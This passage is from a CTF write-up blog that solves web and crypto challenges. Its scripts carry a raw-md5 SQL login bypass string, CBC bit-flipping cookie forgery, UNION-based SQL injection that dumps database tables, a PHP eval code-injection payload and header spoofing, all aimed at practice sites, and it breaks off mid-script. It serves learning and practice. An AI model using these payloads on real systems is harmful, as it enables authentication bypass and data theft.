<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//the result is fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span></span><br></pre></td></tr></table></figure>

<p>solving:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">#'ISCC'md5之后的结果</span></span><br><span class="line">    $mkey =<span class="string">'729623334f0aa2784a1599fd374c120d'</span>;</span><br><span class="line">    $target=<span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>;</span><br><span class="line">    $target=base64_decode($target);</span><br><span class="line"></span><br><span class="line">    $target_ay=<span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($target);$i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> ord($target[$i]).<span class="string">' '</span>;</span><br><span class="line">        array_push($target_ay,ord($target[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"||||||||"</span>;</span><br><span class="line">    $j=<span class="number">0</span>;</span><br><span class="line">    $realkey_ay=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($target);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($j==strlen($mkey))&#123;</span><br><span class="line">            $j=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> ord($mkey[$j]).<span class="string">' '</span>;</span><br><span class="line">        array_push($realkey_ay,ord($mkey[$j]));</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">    $flag1=<span class="string">''</span>;</span><br><span class="line">    $flag2=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($target_ay <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        $i=$key;</span><br><span class="line">        $dd=$value;</span><br><span class="line">        $od=$realkey_ay[$i];</span><br><span class="line">        $flag1.=chr($dd+<span class="number">128</span>-$od);</span><br><span class="line">        $flag2.=chr($dd-$od);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="easy-login-background"><a href="#easy-login-background" class="headerlink" title="easy login background"></a>easy login background</h3><p><a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">link of the problem</a></p>
<p>press the ctrl+u to check the source code:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- $password=$_POST['password'];</span></span><br><span class="line"><span class="comment">	$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";</span></span><br><span class="line"><span class="comment">	$result=mysqli_query($link,$sql);</span></span><br><span class="line"><span class="comment">		if(mysqli_num_rows($result)&gt;0)&#123;</span></span><br><span class="line"><span class="comment">			echo 'flag is :'.$flag;</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		else&#123;</span></span><br><span class="line"><span class="comment">			echo '密码错误!';</span></span><br><span class="line"><span class="comment">		&#125; --&gt;</span></span><br></pre></td></tr></table></figure>

<p>md5($password,true) calculate md5-value;<br>and there is a string make the sql require as :</p>
<blockquote>
<p>SELECT * FROM admin WHERE username = ‘admin’ and password = ‘’ or 6…….</p>
</blockquote>
<p>and this string is :<br>** ffifdyop **</p>
<h1 id="cbc-字节反转"><a href="#cbc-字节反转" class="headerlink" title="cbc 字节反转"></a>cbc 字节反转</h1><h2 id="javisoj-xman-2019-xbitf"><a href="#javisoj-xman-2019-xbitf" class="headerlink" title="javisoj xman 2019 xbitf"></a>javisoj xman 2019 xbitf</h2><p>源代码如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unbuffered</span><span class="params">(object)</span>:</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">       self.stream = stream</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, attr)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> getattr(self.stream, attr)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"><span class="comment">#import signal</span></span><br><span class="line"><span class="comment">#signal.alarm(600)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=open(<span class="string">"/root/xbitf/flag"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_cbc</span><span class="params">(key,iv,m)</span>:</span></span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.encrypt(m).encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_cbc_dec</span><span class="params">(key,iv,c)</span>:</span></span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.decrypt(c.decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">key=os.urandom(<span class="number">16</span>)</span><br><span class="line">iv=os.urandom(<span class="number">16</span>)</span><br><span class="line">session=os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">token=<span class="string">"session="</span>+session.encode(<span class="string">"hex"</span>)+<span class="string">";admin=0"</span></span><br><span class="line"> </span><br><span class="line">checksum=aes_cbc(key,iv,token)</span><br><span class="line"><span class="keyword">print</span> token+<span class="string">";checksum="</span>+checksum</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    token_rcv=raw_input(<span class="string">"token:"</span>)</span><br><span class="line">    <span class="keyword">if</span> token_rcv.split(<span class="string">"admin="</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'1'</span> <span class="keyword">and</span> token_rcv.split(<span class="string">"session="</span>)[<span class="number">1</span>][<span class="number">0</span>:<span class="number">16</span>].decode(<span class="string">"hex"</span>)==session:</span><br><span class="line">        c_rcv=token_rcv.split(<span class="string">"checksum="</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        m_rcv=aes_cbc_dec(key,iv,c_rcv)</span><br><span class="line">        <span class="comment"># 讲解码的结果打印出来</span></span><br><span class="line">        <span class="keyword">print</span> m_rcv</span><br><span class="line">        <span class="keyword">if</span> m_rcv.split(<span class="string">"admin="</span>)[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'1'</span>:</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>解题脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plain = <span class="string">"session=c3b76cc709a8fddf;admin=0"</span></span><br><span class="line">checksum=<span class="string">"92b612cdfa0abf5a415ab73f7f19826853473d7b02378fc836c6248502390b29"</span></span><br><span class="line"></span><br><span class="line">bit = (ord(checksum.decode(<span class="string">'hex'</span>)[<span class="number">15</span>]) ^ord(<span class="string">'0'</span>) ^ ord(<span class="string">'1'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个16位加密之后都会变成32位，这里要替换第一组的最后一个字节所加密后的内容</span></span><br><span class="line">checksum_final = checksum[:<span class="number">30</span>] + hex(bit)[<span class="number">2</span>:] + checksum[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">print</span> checksum_final</span><br></pre></td></tr></table></figure>

<p>在session通过之后就不再对session进行验证了，所以前16位乱码也没有关系。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/62346910-70f6ff00-b52a-11e9-9827-95e90cbebd1d.png" alt="image"></p>
<h2 id="bugku-login4"><a href="#bugku-login4" class="headerlink" title="bugku login4"></a>bugku login4</h2><p>这道题由于自己没有认认真真去做，导致做出来花费了很多时间。相关writeup如下：</p>
<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80684485" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80684485</a></p>
<p><a href="https://www.jianshu.com/p/a61756e54f4f" target="_blank" rel="noopener">https://www.jianshu.com/p/a61756e54f4f</a></p>
<p>自己的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$iv=<span class="string">'4NyZMJ9AOU5JGstqfld10A%3D%3D'</span>;</span><br><span class="line">$cipher=<span class="string">'T3tpIgej42eqA3etE61DRqavWBNrphk4dxENvNgSoYUBiB07C5YKCPwtOUm9pZYINeDrM%2BelzJ3sezJaHufNkA%3D%3D'</span>;</span><br><span class="line"><span class="comment">//username=bdmin password=111</span></span><br><span class="line"></span><br><span class="line">$iv=base64_decode(urldecode($iv));</span><br><span class="line">$cipher=base64_decode(urldecode(($cipher)));</span><br><span class="line"></span><br><span class="line">$source=<span class="keyword">array</span>(<span class="string">'username'</span>=&gt;<span class="string">'bdmin'</span>,<span class="string">'password'</span>=&gt;<span class="string">'111'</span>);</span><br><span class="line">$plain=serialize($source);</span><br><span class="line"></span><br><span class="line">$plain1 = substr($plain,<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">$plain2 = substr($plain,<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">$cipher[<span class="number">9</span>] = chr(ord($cipher[<span class="number">9</span>])^ord(<span class="string">'b'</span>)^ord(<span class="string">'a'</span>));</span><br><span class="line"></span><br><span class="line">$new_iv=<span class="string">''</span>;</span><br><span class="line">$wrong_plain=base64_decode(<span class="string">"U0odmU+LM2Bc4HLVCFql2G1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjExMSI7fQ=="</span>);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">    $new_iv.=chr(ord($wrong_plain[$i])^ord($plain1[$i])^ord($iv[$i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode($new_iv)).<span class="string">'   '</span>.urlencode(base64_encode($cipher));</span><br></pre></td></tr></table></figure>

<h2 id="实验吧-简单的登陆题"><a href="#实验吧-简单的登陆题" class="headerlink" title="实验吧 简单的登陆题"></a>实验吧 简单的登陆题</h2><p>真难</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">denglu</span><span class="params">(payload,idx,c1,c2)</span>:</span></span><br><span class="line">    url=<span class="string">r'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">    payload = &#123;<span class="string">'id'</span>: payload&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    Set_Cookie=r.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line">    iv=re.findall(<span class="string">r"iv=(.*?),"</span>, Set_Cookie)[<span class="number">0</span>]</span><br><span class="line">    cipher=re.findall(<span class="string">r"cipher=(.*)"</span>, Set_Cookie)[<span class="number">0</span>]</span><br><span class="line">    iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">    cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">    lst=list(cipher_raw)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    cipher_new=<span class="string">''</span>.join(lst)</span><br><span class="line">    cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">    cookie_new=&#123;<span class="string">'iv'</span>: iv,<span class="string">'cipher'</span>:cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    cont=r.content</span><br><span class="line">    plain = re.findall(<span class="string">r"base64_decode\('(.*?)'\)"</span>, cont)[<span class="number">0</span>]</span><br><span class="line">    plain = b64decode(plain)</span><br><span class="line">    first=<span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">    iv_new=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">    cookie_new = &#123;<span class="string">'iv'</span>: iv_new, <span class="string">'cipher'</span>: cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    rcont = r.content</span><br><span class="line">    <span class="keyword">print</span> rcont</span><br><span class="line"></span><br><span class="line">denglu(<span class="string">'12'</span>,<span class="number">4</span>,<span class="string">'2'</span>,<span class="string">'#'</span>)</span><br><span class="line">denglu(<span class="string">'0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">'0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br><span class="line">denglu(<span class="string">"0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);"</span>+chr(<span class="number">0</span>),<span class="number">6</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br></pre></td></tr></table></figure>

<p>自己的脚本会出现错误</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line">post=&#123;<span class="string">'id'</span>:<span class="string">"0 2nion select * from((select 1)a join (select 2)b join (select 3)c);"</span>+chr(<span class="number">0</span>)&#125;</span><br><span class="line">responce=requests.post(url,data=post)</span><br><span class="line"></span><br><span class="line">iv=base64.b64decode(urllib.unquote(re.findall(<span class="string">r"iv=(.*?),"</span>,responce.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]))</span><br><span class="line">cipher=base64.b64decode(urllib.unquote(re.findall(<span class="string">r"cipher=(.*)"</span>,responce.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span><span class="params">(cipher,old_iv,offset,old_letter,new_letter)</span>:</span></span><br><span class="line">    cipher=list(cipher)</span><br><span class="line">    cipher[offset]=chr(ord(old_letter)^ord(new_letter)^ord(cipher[offset]))</span><br><span class="line">    cipher=<span class="string">''</span>.join(cipher)</span><br><span class="line">    cookie=&#123;<span class="string">'cipher'</span>:urllib.quote(base64.b64encode(cipher)),<span class="string">'iv'</span>:urllib.quote(base64.b64encode(old_iv))&#125;</span><br><span class="line">    res=requests.post(url,cookies=cookie)</span><br><span class="line">    wrong_plain=base64.b64decode(re.findall(<span class="string">r"base64_decode\('(.*?)'\)"</span>,res.content)[<span class="number">0</span>])</span><br><span class="line">    new_iv = <span class="string">''</span></span><br><span class="line">    right=<span class="string">'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        new_iv+=chr(ord(old_iv[i])^ord(wrong_plain[i])^ord(right[i]))</span><br><span class="line">    cookie=&#123;<span class="string">'cipher'</span>:urllib.quote(base64.b64encode(cipher)),<span class="string">'iv'</span>:urllib.quote(base64.b64encode(new_iv))&#125;</span><br><span class="line">    res=requests.post(url,cookies=cookie)</span><br><span class="line">    <span class="keyword">print</span> res.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer(cipher,iv,<span class="number">7</span>,<span class="string">'2'</span>,<span class="string">'u'</span>)</span><br></pre></td></tr></table></figure>

<p>错误报告如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your</span><br><span class="line">MySQL server version for the right syntax to use near &apos;2)ion select * from((select 1)a</span><br><span class="line">join (select 2)b join (select 3)c);&apos; at line 1</span><br></pre></td></tr></table></figure>

<p>也就是说改变的位置发生了变化，但是对另一些payload来说却可以正常运行，很是奇怪，难道是正则表达式的问题?<br>明白了，正则表达式没有问题，是自己以为前面字段一样序列化之后前面的字段也会一样的原因导致，其实是不一样的<br>一个偏移位置为6，一个为7，这个正则要好好看看</p>
<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><h3 id="shiyanbar-do-you-really-know-php-plalindrome"><a href="#shiyanbar-do-you-really-know-php-plalindrome" class="headerlink" title="shiyanbar do you really know php?(plalindrome)"></a>shiyanbar do you really know php?(plalindrome)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = <span class="string">""</span>;</span><br><span class="line">$req = [];</span><br><span class="line">$flag=<span class="string">"xxxxxxxxxx"</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">   header(<span class="string">"hint:6c525af4059b4fe7d8c33a.txt"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([$_POST] <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $value = trim($value);</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123;</span><br><span class="line">    $number = strval($number);</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $j = strlen($number) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123;</span><br><span class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        $j--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//can not input number</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//the number must be int-type</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])))&#123;</span><br><span class="line"></span><br><span class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</span><br><span class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));</span><br><span class="line"></span><br><span class="line"><span class="comment">//the number should be plalindrome</span></span><br><span class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</span><br><span class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//the number should not be plalindrome</span></span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span><br><span class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>;</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $info;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload :2147483647%00</p>
<p>first: as there is %00, is_numeric() will not recognize it as number</p>
<p>second: both strval and intval will ignore %00 and %20</p>
<p>third: after strrev() 2147483647 will turn to 7463847412 , however, intval() can hanle max num of 2147483647,<br>so intval(7463847412)=2147483647</p>
<p>forth: the number is not plalindrome,so get the flag</p>
]]></content>
  </entry>
  <entry>
    <title>bugku writeup</title>
    <url>/2019/04/22/bugku-writeup/</url>
    <content><![CDATA[<h1 id="bugku-writeup"><a href="#bugku-writeup" class="headerlink" title="bugku writeup"></a>bugku writeup</h1><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>网站里面循环弹出提示框，用chrome的开发者工具打开一片空白，<br>用ctrl+u查看源代码，发现一串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;</span><br><span class="line">&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;</span><br><span class="line">&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</span><br></pre></td></tr></table></figure>

<p>这是unicode，转码即可</p>
<h2 id="你必须让他停下来！"><a href="#你必须让他停下来！" class="headerlink" title="你必须让他停下来！"></a>你必须让他停下来！</h2><p>查看源代码竟然直接有flag了，网上的解法是抓包</p>
<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p><img src="assets/markdown-img-paste-20181124142129765.png" alt><br>解法:利用hellow构造payload<br>$_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。<br>var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。<br>递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对<br>eval并无影响，对于eval来说，和eval（$a）是一样的。</p>
<p>  payload：/index.php?hello = show_source(‘flag.php’)<br>  网上的payload：/index.php?hello=1);show_source(‘flag.php’);var_dump(</p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>编辑etc/hosts添加一条123.206.87.240     flag.bugku.com，<br>在浏览器中打开flag.bugku.com即可得到flag。</p>
<p>反思：host请求头是http1.1添加的东西，<br>添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。</p>
<p>添加host之前访问ip地址结果显示错误400（缺少host）<br>添加host之后访问ip地址结果显示错误403（读取访问被禁）</p>
<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>使用burpsuite的repeater功能进行抓包操作，<br>通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag</p>
<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>函数知识：<br>  isset（）判断是否有输入<br>  pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w+的意思是0<del>9 a</del>z A~Z，<br>  输入的内容被限定了，所以不能输入代码</p>
<p><img src="assets/markdown-img-paste-20181124143335113.png" alt></p>
<p>输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag</p>
<h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p>查看源代码，发现jother编码，打开控制台输入就行了</p>
<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有，<br>点击显示头文件源代码，显示flag（注释形式）</p>
<p>也可以：<br><img src="assets/markdown-img-paste-20181124145558281.png" alt></p>
<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>扫描端口<br><img src="assets/markdown-img-paste-20181124145054565.png" alt><br>发现登陆界面</p>
<p>然后用burpsuite的intruder功能破解</p>
<h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>打开界面后是一个登陆界面，输入一些东西，点击显示：<br><img src="assets/markdown-img-paste-20181124145951495.png" alt></p>
<p>实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端，<br>也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。<br>也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理，<br>都会在尾部添加一个代理的ip，<br>X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。<br>同时查看网页源代码发现，有一串注释，查到说是base64编码，<br>特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截，<br>添加X-Forwarded-For：127。0.0.1后发送，得到了flag</p>
<p>参考资料：ctf中常见的编码格式： <a href="https://www.cnblogs.com/gwind/p/7997922.html" target="_blank" rel="noopener">https://www.cnblogs.com/gwind/p/7997922.html</a></p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>查看源代码，发现一串url编码的东西，<br>Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">a = <span class="string">'%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74</span></span><br><span class="line"><span class="string">%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c</span></span><br><span class="line"><span class="string">%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%</span></span><br><span class="line"><span class="string">3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70</span></span><br><span class="line"><span class="string">%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62'</span></span><br><span class="line"></span><br><span class="line">b = <span class="string">'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d</span></span><br><span class="line"><span class="string">%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72</span></span><br><span class="line"><span class="string">%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72</span></span><br><span class="line"><span class="string">%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45</span></span><br><span class="line"><span class="string">%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75</span></span><br><span class="line"><span 